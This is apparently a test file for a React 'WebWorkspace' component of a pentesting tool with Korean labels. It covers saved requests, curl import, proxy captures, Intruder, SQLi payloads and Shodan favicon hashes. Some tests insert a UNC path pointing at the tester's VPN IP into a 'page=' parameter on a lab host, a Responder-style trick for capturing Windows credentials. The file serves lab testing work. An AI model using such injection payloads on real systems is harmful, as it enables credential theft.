// @vitest-environment jsdom
import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { afterEach, expect, it, vi } from "vitest";
import WebWorkspace from "./WebWorkspace";
import { shodanFaviconHash } from "./murmurHash";

const target = { id: 1, project_id: 1, name: "10.10.10.10", ip: "10.10.10.10" };
const savedRequest = {
  id: 5, project_id: 1, target_id: 1, name: "Login test",
  folder: "", tags: "[]", method: "GET", url: "http://10.10.10.10/", query: "{}",
  headers: "{}", cookies: "{}", body: "", body_mode: "raw", tls_verify: true,
  proxy: "", timeout: 30, follow_redirects: false,
};

function response(body: unknown, status = 200) {
  return Promise.resolve(new Response(
    status === 204 ? null : JSON.stringify(body),
    { status, headers: { "Content-Type": "application/json" } },
  ));
}

function mount(fetcher: ReturnType<typeof vi.fn>) {
  vi.stubGlobal("fetch", fetcher);
  const client = new QueryClient({ defaultOptions: { queries: { retry: false, staleTime: Infinity } } });
  return render(<QueryClientProvider client={client}><WebWorkspace /></QueryClientProvider>);
}

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

it("deletes a saved request after confirmation and clears it from the list", async () => {
  let deleted = false;
  const fetcher = vi.fn((url: string, init?: RequestInit) => {
    if (url === "/api/targets") return response([target]);
    if (url.startsWith("/api/web/requests?target_id="))
      return response(deleted ? [] : [savedRequest]);
    if (url === "/api/web/requests/5" && init?.method === "DELETE") {
      deleted = true;
      return response(null, 204);
    }
    throw new Error(`unhandled fetch ${url}`);
  });
  vi.spyOn(window, "confirm").mockReturnValue(true);
  mount(fetcher);

  await screen.findByText("Login test");
  fireEvent.click(screen.getByLabelText("Login test 삭제"));

  expect(window.confirm).toHaveBeenCalledWith(
    '"Login test" 요청과 저장된 응답 이력을 삭제할까요? 되돌릴 수 없습니다.',
  );
  await waitFor(() => expect(screen.queryByText("Login test")).toBeNull());
});

it("keeps the request when the confirmation is declined", async () => {
  const fetcher = vi.fn((url: string) => {
    if (url === "/api/targets") return response([target]);
    if (url.startsWith("/api/web/requests?target_id=")) return response([savedRequest]);
    throw new Error(`unhandled fetch ${url}`);
  });
  vi.spyOn(window, "confirm").mockReturnValue(false);
  mount(fetcher);

  await screen.findByText("Login test");
  fireEvent.click(screen.getByLabelText("Login test 삭제"));

  expect(fetcher).not.toHaveBeenCalledWith("/api/web/requests/5", expect.anything());
  expect(screen.getByText("Login test")).toBeTruthy();
});

it("sends SQLi payloads straight to the Intruder tab, even with nothing saved yet", async () => {
  const fetcher = vi.fn((url: string) => {
    if (url === "/api/targets") return response([target]);
    if (url.startsWith("/api/web/requests?target_id=")) return response([]);
    throw new Error(`unhandled fetch ${url}`);
  });
  mount(fetcher);

  await screen.findByText("저장된 요청이 없습니다");
  fireEvent.click(screen.getByRole("tab", { name: "SQLi 참고" }));
  fireEvent.click(screen.getAllByText("Intruder로")[0]);

  expect(screen.getByRole("tab", { name: "Intruder" }).getAttribute("aria-selected")).toBe("true");
  expect(screen.getByText("먼저 저장된 요청이 필요합니다.")).toBeTruthy();

  fireEvent.click(screen.getByText("Request 탭 열기 →"));
  expect(screen.getByText(/페이로드 \d+개가 대기 중입니다\./)).toBeTruthy();
});

it("imports a pasted curl command into the request editor", async () => {
  const fetcher = vi.fn((url: string) => {
    if (url === "/api/targets") return response([target]);
    if (url.startsWith("/api/web/requests?target_id=")) return response([]);
    throw new Error(`unhandled fetch ${url}`);
  });
  mount(fetcher);

  await screen.findByText("저장된 요청이 없습니다");
  fireEvent.click(screen.getByText("cURL 붙여넣기로 가져오기"));
  fireEvent.change(screen.getByPlaceholderText(/curl 'http/), { target: { value:
    "curl 'http://10.10.10.10/login.php' -H 'Cookie: PHPSESSID=abc' --data-raw 'username=admin&password=x'" } });
  fireEvent.click(screen.getByText("가져오기"));

  expect((screen.getByDisplayValue("http://10.10.10.10/login.php") as HTMLInputElement).value)
    .toBe("http://10.10.10.10/login.php");
  expect((screen.getByDisplayValue("username=admin&password=x") as HTMLTextAreaElement).value)
    .toBe("username=admin&password=x");
  expect((screen.getByDisplayValue('{"PHPSESSID":"abc"}') as HTMLTextAreaElement).value)
    .toBe('{"PHPSESSID":"abc"}');
});

it("opens a captured request into Intruder from the Proxy tab", async () => {
  const capturedRequest = {
    id: 9, project_id: 1, target_id: 1, name: "POST http://10.10.10.10/login.php",
    folder: "Proxy Capture", tags: '["proxy-capture"]', method: "POST",
    url: "http://10.10.10.10/login.php", query: "{}", headers: "{}", cookies: "{}",
    body: "username=admin&password=x", body_mode: "raw", tls_verify: true,
    proxy: "", timeout: 30, follow_redirects: false,
  };
  const fetcher = vi.fn((url: string) => {
    if (url === "/api/targets") return response([target]);
    if (url.startsWith("/api/web/requests?target_id=")) return response([]);
    if (url === "/api/web/proxy/status") return response({ running: false, stderr_tail: [] });
    if (url.startsWith("/api/web/proxy/captures")) return response([capturedRequest]);
    throw new Error(`unhandled fetch ${url}`);
  });
  mount(fetcher);

  await screen.findByText("저장된 요청이 없습니다");
  fireEvent.click(screen.getByRole("tab", { name: "Proxy" }));
  await screen.findByText("POST http://10.10.10.10/login.php");
  fireEvent.click(screen.getByText("Intruder로"));

  expect(screen.getByRole("tab", { name: "Intruder" }).getAttribute("aria-selected")).toBe("true");
  expect(screen.queryByText("먼저 저장된 요청이 필요합니다.")).toBeNull();
});

it("shows response headers and a Shodan favicon-hash link after sending a request", async () => {
  const bodyBytes = new TextEncoder().encode("FAKE-ICO-BYTES");
  const exchange = {
    id: 42, status_code: 200, duration_ms: 12, size: bodyBytes.length,
    response_headers: JSON.stringify({
      Server: "Apache-Coyote/1.1", "Content-Type": "image/x-icon",
    }),
    response_cookies: "{}", sha256: "abc", error: "", created_at: "2024-01-01T00:00:00Z",
  };
  const fetcher = vi.fn((url: string, init?: RequestInit) => {
    if (url === "/api/targets") return response([target]);
    if (url.startsWith("/api/web/requests?target_id=")) return response([savedRequest]);
    if (url === "/api/web/requests/5/exchanges") return response([]);
    if (url === "/api/web/requests/5/send" && init?.method === "POST")
      return response([exchange]);
    if (url === "/api/web/exchanges/42/body")
      return Promise.resolve(new Response(bodyBytes));
    throw new Error(`unhandled fetch ${url}`);
  });
  mount(fetcher);

  await screen.findByText("Login test");
  fireEvent.click(screen.getByText("Login test"));
  fireEvent.click(screen.getByLabelText("허가된 요청"));
  fireEvent.click(screen.getByText("전송"));

  await screen.findByText(/Server: Apache-Coyote\/1\.1/);
  expect(screen.getByText(/Content-Type: image\/x-icon/)).toBeTruthy();

  const expectedHash = shodanFaviconHash(bodyBytes);
  await screen.findByText(String(expectedHash));
  const link = screen.getByText("Shodan에서 같은 해시 검색 ↗").closest("a");
  expect(link?.getAttribute("href")).toBe(
    `https://www.shodan.io/search?query=http.favicon.hash%3A${expectedHash}`,
  );
});

it("shows an error and leaves the draft alone for text that isn't a curl command", async () => {
  const fetcher = vi.fn((url: string) => {
    if (url === "/api/targets") return response([target]);
    if (url.startsWith("/api/web/requests?target_id=")) return response([]);
    throw new Error(`unhandled fetch ${url}`);
  });
  mount(fetcher);

  await screen.findByText("저장된 요청이 없습니다");
  fireEvent.click(screen.getByText("cURL 붙여넣기로 가져오기"));
  fireEvent.change(screen.getByPlaceholderText(/curl 'http/), { target: { value: "not a curl command" } });
  fireEvent.click(screen.getByText("가져오기"));

  expect(screen.getByText(/유효한 curl 명령어가 아닙니다/)).toBeTruthy();
});

it("inserts a UNC path built from the detected tun0 IP at the URL cursor position", async () => {
  const fetcher = vi.fn((url: string) => {
    if (url === "/api/targets") return response([target]);
    if (url.startsWith("/api/web/requests?target_id=")) return response([]);
    if (url === "/api/vpn/status")
      return response({ connected: true, tun0: "tun0 UNKNOWN 10.10.16.178/23" });
    throw new Error(`unhandled fetch ${url}`);
  });
  mount(fetcher);

  await screen.findByText("저장된 요청이 없습니다");
  const button = await screen.findByText("Responder IP 삽입 (10.10.16.178)") as HTMLButtonElement;
  expect(button.disabled).toBe(false);
  const urlInput = screen.getByLabelText("URL") as HTMLInputElement;
  fireEvent.change(urlInput, { target: { value: "http://unika.htb/index.php?page=" } });
  urlInput.setSelectionRange(urlInput.value.length, urlInput.value.length);

  fireEvent.click(button);

  expect((screen.getByDisplayValue(/index\.php\?page=/) as HTMLInputElement).value)
    .toBe("http://unika.htb/index.php?page=\\\\10.10.16.178\\test");
});

it("replaces an existing page= value outright instead of appending to it", async () => {
  const fetcher = vi.fn((url: string) => {
    if (url === "/api/targets") return response([target]);
    if (url.startsWith("/api/web/requests?target_id=")) return response([]);
    if (url === "/api/vpn/status")
      return response({ connected: true, tun0: "tun0 UNKNOWN 10.10.16.178/23" });
    throw new Error(`unhandled fetch ${url}`);
  });
  mount(fetcher);

  await screen.findByText("저장된 요청이 없습니다");
  const button = await screen.findByText("Responder IP 삽입 (10.10.16.178)") as HTMLButtonElement;
  const urlInput = screen.getByLabelText("URL") as HTMLInputElement;
  fireEvent.change(urlInput, { target: { value: "http://unika.htb/index.php?page=french.html" } });

  fireEvent.click(button);
  expect((screen.getByLabelText("URL") as HTMLInputElement).value)
    .toBe("http://unika.htb/index.php?page=\\\\10.10.16.178\\test");

  // Clicking again must not double up the payload.
  fireEvent.click(button);
  expect((screen.getByLabelText("URL") as HTMLInputElement).value)
    .toBe("http://unika.htb/index.php?page=\\\\10.10.16.178\\test");
});

it("defaults a new request's URL to the confirmed hostname instead of the bare IP", async () => {
  const withHostname = { ...target, hostname: "unika.htb" };
  const fetcher = vi.fn((url: string) => {
    if (url === "/api/targets") return response([withHostname]);
    if (url.startsWith("/api/web/requests?target_id=")) return response([]);
    if (url === "/api/vpn/status") return response({ connected: false, tun0: "" });
    throw new Error(`unhandled fetch ${url}`);
  });
  mount(fetcher);

  await screen.findByText("저장된 요청이 없습니다");
  await waitFor(() => expect((screen.getByLabelText("URL") as HTMLInputElement).value)
    .toBe("http://unika.htb/"));
});

it("disables the UNC-insert button until a tun0 IP is detected", async () => {
  const fetcher = vi.fn((url: string) => {
    if (url === "/api/targets") return response([target]);
    if (url.startsWith("/api/web/requests?target_id=")) return response([]);
    if (url === "/api/vpn/status")
      return response({ connected: false, tun0: "" });
    throw new Error(`unhandled fetch ${url}`);
  });
  mount(fetcher);

  await screen.findByText("저장된 요청이 없습니다");
  const button = screen.getByText("Responder IP 삽입") as HTMLButtonElement;
  expect(button.disabled).toBe(true);
});
